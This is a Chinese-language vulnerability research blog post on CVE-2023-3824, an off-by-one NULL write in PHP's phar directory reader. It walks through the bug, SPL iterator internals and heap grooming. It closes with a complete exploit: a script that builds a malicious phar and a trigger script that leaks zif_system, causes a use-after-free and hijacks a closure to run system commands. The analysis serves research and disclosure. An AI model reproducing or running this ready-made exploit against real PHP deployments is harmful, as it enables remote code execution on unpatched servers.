

# CVE-2023-3824: 幸运的 Off-by-one

#### 故事经过

前天看见了一个新闻\[1\], 英国国家打击犯罪局（NCA）、美国联邦调查局（FBI）、欧洲刑警组织等执法部门宣称联合捣毁了世界上最大的网络犯罪集团 LockBit. 这里面提到了这些执法机构利用了一个**PHP 漏洞 (CVE-2023-3824)** , 这引起了我的兴趣。为啥执法机构会暴露这些细节呢？查了一下，原来是该犯罪团伙负责人自己说的，他也只怪自己没有及时地更新 PHP :( .

#### 简略分析

简单搜索了一下，没有找到关于它的利用方式，那只能咱亲自冻手了。首先发现 PHP 官方 Repo 已经收录了这个安全问题\[2\], PHP 官方对此评价为"Exploiting this is difficult to do".

其问题出现在函数`phar_dir_read` at `ext/phar/dirstream.c`. 关于这个函数写的怎么样，咱只能说一言难尽。

```c
static ssize_t phar_dir_read(php_stream *stream, char *buf, size_t count) /* {{{ */
{
	size_t to_read;
	HashTable *data = (HashTable *)stream->abstract;
	zend_string *str_key;
	zend_ulong unused;

	if (HASH_KEY_NON_EXISTENT == zend_hash_get_current_key(data, &str_key, &unused)) {
		return 0;
	}

	zend_hash_move_forward(data);
	to_read = MIN(ZSTR_LEN(str_key), count);

	if (to_read == 0 || count < ZSTR_LEN(str_key)) {
		return 0;
	}

	memset(buf, 0, sizeof(php_stream_dirent));
	memcpy(((php_stream_dirent *) buf)->d_name, ZSTR_VAL(str_key), to_read);
	((php_stream_dirent *) buf)->d_name[to_read + 1] = '\0';

	return sizeof(php_stream_dirent);
}
```

这个函数用于`phar://`协议下读取文件夹中的内容。这段代码出现的一些问题：

1.  后面的`memset`已经假设了`buf`的大小是`sizeof(php_stream_dirent)`. 因此函数开头理因有一个关于它的检查，却没有看见。然而这个问题在这里其实不大，因为在 PHP 中所有引用这个函数的地方，传入的`count`和`sizeof(php_stream_dirent)` 都是保持一致的。当然这样的做法依然是不对的，因为需要考虑 PHP 第三方库对其的使用规范。
2.  注意这里我们只考虑 Linux 的下利用情况，全篇亦是如此。在 Linux 下`sizeof(php_stream_dirent)`为`4096`. 当文件夹中存在一个文件名长度为`4096`的文件时，在第 13 行这里即有`to_read == 4096`, 从而第 14 行这里的判断顺利通过了 (i.e., `count == ZSTR_LEN(str_key) == 4096`). 考虑第 21 行这里的结尾 NULL 字符写入，我们知道传入的 buffer 大小为`4096`, 再往后写就肯定 overflow 了。有趣是它写 NULL 的位置也错了，应该在`d_name[to_read]`写`NULL`, 而不是`to_read + 1`. 这样就给我们带来在`buf + 4097`处写零的机会。

经典的 Off-by-one, 这让我想到了著名的 CVE-2019-11043\[4\], 值得一试。

#### 找利用点

根据`buf`所处的位置，可以营造 stack overflow 和 heap overflow, 进而有两种不同的利用方式。根据常识利用 Off-by-one 关键是 memory layout. 简要搜索一下，有几个地方可以操作上述函数：

1.  `buf`在 stack 上：
    1.  `openddir` + `readdir`
    2.  `scandir`
    3.  libmagic 中的 `apprentice_load`
2.  `buf`在 heap 上：
    1.  `FilesystemIterator`
    2.  `DirectoryIterator`
    3.  `SplFileInfo`
    4.  `SplFileObject`

因为绕不过 canary, 所以直接将 stack overflow 排除了，只剩下了 heap overflow.

#### Heap overflow

上述 4 个类都是 PHP 标准库中操作文件夹的相关设施，位于`ext/spl/spl_directory.c`. 它们底层都涉及一个比较关键的结构`_spl_filesystem_object`如下，我略去了该结构中不太重要的字段。

```c
struct _spl_filesystem_object {
    // ...
    union {
        struct {
            php_stream         *dirp;
            php_stream_dirent  entry; // overflow here
            char               *sub_path;
            size_t             sub_path_len;
            // ...
        } dir;
        // ...
    } u;
    // ...
};
```

其中`_spl_filesystem_object.u.dir.entry`就是上述 4 个类在操作文件夹时`buf`所处的位置。可以看到其后面紧跟着一个`sub_path`字段，配合`sub_path_len`, 不难看出这里是一个 binary-safe string 结构。试想如果利用 overflow 把`sub_path`某个字节覆写掉，肯定可以带来一些新的契机。这也是文章标题称之为《幸运的 Off-by-one》.

#### Spl\_filesystem\_object is the key

这里我们首先需要知道一些关于`spl_filesystem_object.u.dir.entry`和`spl_filesystem_object.u.dir.sub_path`的操作。

**更新 `u.dir.entry`** : 由这个函数可以触发 overflow. 通过检查引用这个函数的地方，看起来我们只需要拨动相关的 Iterator 即可触发这个函数。

```c
// ext/spl/spl_directory.c: 236
static int spl_filesystem_dir_read(spl_filesystem_object *intern) /* {{{ */
{
	if (!intern->u.dir.dirp || !php_stream_readdir(intern->u.dir.dirp, &intern->u.dir.entry)) {
		intern->u.dir.entry.d_name[0] = '\0';
		return 0;
	} else {
		return 1;
	}
}
```

**读取 `u.dir.sub_path`** : 通过调用`RecursiveDirectoryIterator->getSubPath`即可

```c
// ext/spl/spl_directory.c: 1530
PHP_METHOD(RecursiveDirectoryIterator, getSubPath)
{
	spl_filesystem_object *intern = Z_SPLFILESYSTEM_P(ZEND_THIS);

	if (zend_parse_parameters_none() == FAILURE) {
		RETURN_THROWS();
	}

	if (intern->u.dir.sub_path) {
		RETURN_STRINGL(intern->u.dir.sub_path, intern->u.dir.sub_path_len);
	} else {
		RETURN_EMPTY_STRING();
	}
}
```

**写入 `u.dir.sub_path`** : 通过调用`RecursiveDirectoryIterator->getChildren`即可

```c
// ext/spl/spl_directory.c: 1494
PHP_METHOD(RecursiveDirectoryIterator, getChildren)
{
	// ...
	if (subdir) {
        // 如果 current directory 也存在 sub_path, 那么 children 的 sub_path 应为  parent_sub_path + parent_directory_name
		if (intern->u.dir.sub_path && intern->u.dir.sub_path[0]) {
			subdir->u.dir.sub_path_len = spprintf(&subdir->u.dir.sub_path, 0, "%s%c%s", intern->u.dir.sub_path, slash, intern->u.dir.entry.d_name);
		} else {
            // 反之，此时 children 的 sub_path 应为 parent_directory_name
			subdir->u.dir.sub_path_len = strlen(intern->u.dir.entry.d_name);
			subdir->u.dir.sub_path = estrndup(intern->u.dir.entry.d_name, subdir->u.dir.sub_path_len);
		}
		subdir->info_class = intern->info_class;
		subdir->file_class = intern->file_class;
		subdir->oth = intern->oth;
	}
}
```

**释放 `u.dir.sub_path`**: 通过调用`unset($obj)`即可。

```c
//
static void spl_filesystem_object_free_storage(zend_object *object) /* {{{ */
{
	...
	case SPL_FS_DIR:
		if (intern->u.dir.sub_path) {
			efree(intern->u.dir.sub_path);
		}
		break;
	...
}
```

#### conditional read 和 conditional write 原语

这里我们没有任意读/写两个原语，只有有条件的读/写。

**conditional read**

1.  在 heap 上放置大量需要需要读取的内存结构，比如`zend_closure`. 让其中一些刚好落在拥有形如`00xx`前缀的地址上。
2.  正常初始化`sub_path`, 控制好其大小，落在可控内存结构的附近。
3.  然后触发 overflow, 将`sub_path`的第 2 个字节写 NULL.
4.  调用`RecursiveDirectoryIterator0->getSubPath`, 读取相关结构。

**conditional write** (UAF)

1.  在 heap 上放置大量的可控的内存结构，比如`zend_string`. 让其中一些刚好落在拥有形如`00xx`前缀的地址上。
2.  正常初始化`sub_path`, 控制好其大小，落在可控内存结构的附近。
3.  然后触发 overflow, 将`sub_path`的第 2 个字节写 NULL, 此时`sub_path`指向我们可控的内存结构。
4.  构造 UAF: 释放掉对应的 iterator (`unset($obj)`).
5.  在刚释放的内存上创建所需结构，利用第一步中可控结构读写它。

#### 增强 conditional read 和 conditional write 原语。

举个例子，在 conditional read 中，如果`sub_path`指向形如`0xdeadbeef`的地址，那么我们只能读`0xdead00ef`处的内容。意味着需要读取的内存结构需要落在它的附近。这里有两个难点：

1.  如何让需要被写入或者被读入的内存结构落在拥有形如`00xx`前缀的地址上？
    
2.  如何使得被改写的`sub_path`刚好指向拥有`00xx`前缀的地址上 ?
    

在处理这两个问题之前，我们需要熟悉一下 PHP 的内存管理。

1.  PHP 采用了 memory slots 的手法，即针对小内存 (8 - 3072 bytes), 它会在连续的页上按大小划分 slots. 举个例子，对于 8 bytes 内存，PHP 会拿出 1 个 page (4096 bytes) 出来，将其划分为 512 个 bins 供给小于或者等于 8 bytes 的内存申请。而对于 320 bytes 内存，PHP 会拿出 5 个 pages 出来，再上面划分 64 个 bins 供给 256< x <=320 的内存申请。小内存的回收采用是经典地 free\_lists.
2.  PHP 使用 memory chunk (跟 arena 是有些相似的) 来作为小内存的操作对象。一个 memory chunk 默认大小为 2M (0x200000), PHP 在其上根据需求来划分不用小内存区域。当一个 memory chunk 使用完了之后，PHP 会申请新的 chunk. 用链表将这些 chunks 连接起来。

**增强 conditional read**

对于第一个问题，我们可以在 heap 上放置大量连续的相关内存结构，这依赖于 PHP 独特的内存管理。例如在 conditional read 中，我们需要读取`zend_closure`中的`closure_handlders`值，其中`sizeof(zend_closure) == 320`. 如果我们考虑用它将一个 memory chunk 填满，可以利用的相关地址前置有。

```php
<?php
$a = 320;
for (;$a < 0x200000; $a += 320) {
    if ((($a >> 8) & 0xff) == 0) {
        echo dechex($a)."\n";
    }
}

/*
10040,20080,300c0,50000,60040,70080,800c0,a0000,b0040,c0080,d00c0,f0000,100040,110080,1200c0,140000,150040,160080,1700c0,190000,1a0040,1b0080,1c00c0,1e0000,1f0040
*/
```

如果`0x10040`可控，那么`0x10040`和`0x20080`之间就有`51`个 bins 可以用。

```php
<?php
$a = 0x10040;
$i = 0;
while ($a < 0x20080) {
    $a += 320;
    if (($a & 0xff) == 0x40) {
        echo dechex($a)."\n";
        $i++;
    }
    $j++;
}

echo $i;
```

换言之只要让`sub_path`指向到这`51`中的其中一个就可以了。其中`0x10040`和`0x20080`之间有`205`这样的 bins, 这样我们有`1/4`的概率让`sub_path`指向正确的地方。再换言之，我们平均只需要尝试 4 次，就可以做到，事实也是如此。这也是解决第二问题的方法。

所以比较在意是拿到形如`10040, 20080, 300c0...` 这其中的一个。比较好的想法是我们最好的**新的 chunk**上进行操作，这样避免了之前 memory layout 对我们的影响。那最好的想法就是连续申请超过一个 chunk 的相关内存结构。这样我们总可以落在**新的 chunk**上，并且是一定大概率覆盖上述地址。比如这里我们需要申请超过`0x1999`个`zend_closure`个，在利用中我使用了`2024` (毕竟今年是 2024 嘿嘿).

**增强 conditional write**

对于第一个问题，我们同样在 heap 上放置大量我们可控的内存结构。而对于第二个问题，我们同样进行多次尝试。这里有一个特别的是，第二个问题解决方案中的多次尝试是确定性的。因为 heap 上的内存结构我们可控，使得我们可以在指定的位置上放置特定的内容来帮助我们判定`sub_path`有没有指向正确的位置。比如我们希望`sub_path`正好落在地址`0x10040`上，其中`0x10040`是我们可控的。我们可以在`0x10040`处写入指定的字符串，在进行 UAF 之前，我们通过读取`sub_path`的内容，来确保`sub_path`是指向正确的。

#### 利用细节

大致路线：

1.  通过 conditional read 泄露`system`函数地址。
2.  通过 conditional write 将用户闭包函数修改为 native 函数`system`

**构造恶意的 phar**

其中 phar 文件结构如下，命名为`m2.phar`.

```plain
├── CCCCCCC...CCC├
                 ├── AAAA...AAA
                 ├── BBBBBB...BBBBB
```

-   `CCCCCCC...CCC`文件夹长度为`329` , 因为`zend_closure`是我们后面需要的重要结构，它的大小为`320`. 考虑结尾的 NULL 字符。
-   `AAAA...AAA` 正常文件和文件名。`RecursiveDirectoryIterator->__construct`会读取第一个文件作为预备，我不希望在这一步发生 overflow.
-   `BBBBBB...BBBBB`文件名长度为`4096`

**触发 overflow**

我们通过以下代码来触发 overflow

```php
$it = new RecursiveDirectoryIterator("phar://./m2.phar");

// 定位到 `CCCCCCC...CCC` 文件夹
foreach ($it as $file) {
    if($file->isDir()) {
    	break;
    }
}

// 创建关于 `CCCCCCC...CCC` 的 RecursiveDirectoryIterator, 其 sub_path 被初始化为 `CCCCCCC...CCC`, 长度为 320.
$sub_it = $it->getChildren();

// 读取 `CCCCCCC...CCC` 中文件，读取到 `BBBBBB...BBBBB` 时，触发 overflow, 将 sub_path 第 2 个字节写 NULL.
foreach($sub_it as $file) {}
```

**泄露 system 函数地址**

这里我们还是老手法，利用`zend_closure.std.zend_object_handlers` 位于 (`Zend/zend_closures.c: 36`) 来泄露`closure_handlers` (位于 `Zend/zend_closures.c:46`) 的地址。

其中`zend_closure`通过创建闭包函数来生成，即我们通过生成大量的闭包函数来填充 heap.

```php
$f_arr = [];
for ($i = 0; $i < 0x2024; $i++) {
	$f_arr[$i] = function(){};
}
```

然后我们不断修改`sub_path`让其正好落在我们的申请某个`zend_closure`开头，平均 4 次即可。

```php
while (1) {
        $it = create_RDI();
        $sub_it = $it->getChildren();

        // preserve every iterator to avoid double freeing on sub_path
        $it_arr[] = $sub_it;

        // trigger overflow
        foreach($sub_it as $file) {}

        $data = $sub_it->getSubPath();

        // refcounted && is_object, zend_closure 本身也是一个 zend_object, 其鉴别方式为首 8 字节为 0x800000001
        if (read64($data, 0) == 0x800000001) {
            $closure_handlers = read64($data, 0x18);
            break;
        }
    }
```

拿到了`closure_handlers`加上相关偏移地址，我们就可以拿到`zif_system`的地址。

**修改闭包函数**

首先我们需要在 heap 上布置可控的内存结构

```php
$str_arr = [];
for ($i = 0; $i < 0x2024; $i++) {
    $str_arr[$i] = str_repeat('E', 0x140 - 0x20);
    // 作为 sub_path 是否指向正确位置的 unique identifier.
    $str_arr[$i][0] = "I";
    $str_arr[$i][1] = "L";
    $str_arr[$i][2] = "I";
    $str_arr[$i][3] = "K";
    $str_arr[$i][4] = "E";
    $str_arr[$i][5] = "P";
    $str_arr[$i][6] = "H";
    $str_arr[$i][7] = "P";
}
```

依然是不断修改`sub_path`让其正好落在我们的申请某个`zend_string`开头，

```php
while (1) {
    // init sub_path
    $it = create_RDI();
    $sub_it = $it->getChildren();

    // trigger overflow
    foreach($sub_it as $file) {}

    $data = $sub_it->getSubPath();
    if (substr($data, 0x18, 8) == "ILIKEPHP") {
        // trigger UAF
        unset($sub_it);
        $f = function(){};
        break;
    } else {
        // prevent double freeing
        $it_arr[] = $sub_it;
    }
}
```

然后修改我们可控的`zend_string`结构，达到修改闭包函数的任务

```php
for ($i = 0; $i < 0x2024; $i++) {
    // 1. function type: internal function
    // zend_closure.function.internal_function.type = 0x38
    // zend_string_header = 0x18
    write8($str_arr[$i], 0x38 - 0x18, 0);

    // 2. function handler: zif_system
    // zend_closure.function.internal_function.handler = 0x70
    // zend_string_header = 0x18
    write64($str_arr[$i], 0x70 - 0x18, $zif_system);
}
```

#### 完整的 Exploitation

位于\[3\].

PHP 版本 commit: `be71cadc2f899bc39fe27098042139392e2187db`

编译选项：`./configure --disable-all --enable-phar`

**gen\_phar.php**

```php
<?php

if (file_exists("m2.phar")) {
    unlink("m2.phar");
}

$phar = new Phar('m2.phar');

// size of target UAF bin is the size of zend_closure
$dir_name = str_repeat('C', 0x140 - 0x1);
$file_4096 = str_repeat('A', PHP_MAXPATHLEN - 1).'B';

// create an empty directory
$phar->addEmptyDir($dir_name);

// create normal one
$phar->addFromString($dir_name . DIRECTORY_SEPARATOR . str_repeat('A', 32), 'This is the content of the file.');
// trigger overflow
$phar->addFromString($dir_name . DIRECTORY_SEPARATOR . str_repeat('A', PHP_MAXPATHLEN - 1).'B', 'This is the content of the file.');
```

**trigger.php**

```php
<?php

// zif_system_offset - closure_handlers_offset
$zif_system_offset = -0x8a1390;
$it_arr = array();

$zif_system = leak_zif_system_addr();
echo "[*] zif_system address: 0x". dechex($zif_system). "\n";

trigger_UAF($zif_system);

function create_RDI()
{
    $it = new RecursiveDirectoryIterator("phar://./m2.phar");

    // find the first directory
    foreach ($it as $file) {
        // echo $file . "\n";
        if($file->isDir()) {
            break;
        }
    }

    return $it;
}

function leak_zif_system_addr() {
    global $zif_system_offset;
    global $it_arr;

    // fill memory chunk with lots of zend_closures;
    $f_arr = [];
    for ($i = 0; $i < 0x2024; $i++) {
        $f_arr[$i] = function(){};
    }

    // find zend_closure
    $closure_handlers = 0;
    while (1) {
        $it = create_RDI();
        $sub_it = $it->getChildren();

        // preserve every iterator to avoid double freeing on sub_path
        $it_arr[] = $sub_it;

        // trigger overflow
        foreach($sub_it as $file) {}

        $data = $sub_it->getSubPath();

        // refcounted && is_object
        if (read64($data, 0) == 0x800000001) {
            $closure_handlers = read64($data, 0x18);
            break;
        }
    }

    if ($closure_handlers == 0) {
        exit("bad closure handlers\n");
    }

    return $closure_handlers + $zif_system_offset;
}

function trigger_UAF($zif_system) {
    global $it_arr;

    // fill memory chunk with lots of 0x140-size strings,
    // ensure address of some strings that are exactly starting with prefix 0040 or 0080.
    $str_arr = [];
    for ($i = 0; $i < 0x2024; $i++) {
        $str_arr[$i] = str_repeat('E', 0x140 - 0x20);
        $str_arr[$i][0] = "I";
        $str_arr[$i][1] = "L";
        $str_arr[$i][2] = "I";
        $str_arr[$i][3] = "K";
        $str_arr[$i][4] = "E";
        $str_arr[$i][5] = "P";
        $str_arr[$i][6] = "H";
        $str_arr[$i][7] = "P";
    }

    $f = NULL;
    while (1) {
        // init sub_path
        $it = create_RDI();
        $sub_it = $it->getChildren();

        // trigger overflow
        foreach($sub_it as $file) {}

        $data = $sub_it->getSubPath();
        if (substr($data, 0x18, 8) == "ILIKEPHP") {
            // trigger UAF
            unset($sub_it);
            $f = function(){};
            break;
        } else {
            // prevent double freeing
            $it_arr[] = $sub_it;
        }
    }
    // modify closure
    // 1. function type: internal function
    // 2. function handler: zif_system
    for ($i = 0; $i < 0x2024; $i++) {
        // 1. function type: internal function
        // zend_closure.function.internal_function.type = 0x38
        // zend_string_header = 0x18
        write8($str_arr[$i], 0x38 - 0x18, 0);

        // 2. function handler: zif_system
        // zend_closure.function.internal_function.handler = 0x70
        // zend_string_header = 0x18
        write64($str_arr[$i], 0x70 - 0x18, $zif_system);
    }

    $f('uname -an');
}

function read64($str, $p) {
    $v = 0;
    $v |= ord($str[$p + 0]);
    $v |= ord($str[$p + 1]) << 8;
    $v |= ord($str[$p + 2]) << 16;
    $v |= ord($str[$p + 3]) << 24;
    $v |= ord($str[$p + 4]) << 32;
    $v |= ord($str[$p + 5]) << 40;
    $v |= ord($str[$p + 6]) << 48;
    $v |= ord($str[$p + 7]) << 56;
    return $v;
}

function write8(&$str, $p, $v){
    $str[$p] = chr($v & 0xff);
}

function write64(&$str, $p, $v) {
    $str[$p + 0] = chr($v & 0xff);
    $v >>= 8;
    $str[$p + 1] = chr($v & 0xff);
    $v >>= 8;
    $str[$p + 2] = chr($v & 0xff);
    $v >>= 8;
    $str[$p + 3] = chr($v & 0xff);
    $v >>= 8;
    $str[$p + 4] = chr($v & 0xff);
    $v >>= 8;
    $str[$p + 5] = chr($v & 0xff);
    $v >>= 8;
    $str[$p + 6] = chr($v & 0xff);
    $v >>= 8;
    $str[$p + 7] = chr($v & 0xff);
}
```

#### 引用

1.  《挑衅执法机构，LockBit 黑客犯罪团伙死灰复燃》, https://mp.weixin.qq.com/s/sLC\_zuW0Wyk91i7aITbygA
2.  PHP official report, https://github.com/php/php-src/security/advisories/GHSA-jqcx-ccgc-xwhv
3.  完整 exploitation repo, https://github.com/m4p1e/php-exploit/tree/master/CVE-2023-3824
4.  拥抱 php 之 CVE-2019-11043, https://m4p1e.com/2019/11/03/CVE-2019-11043/
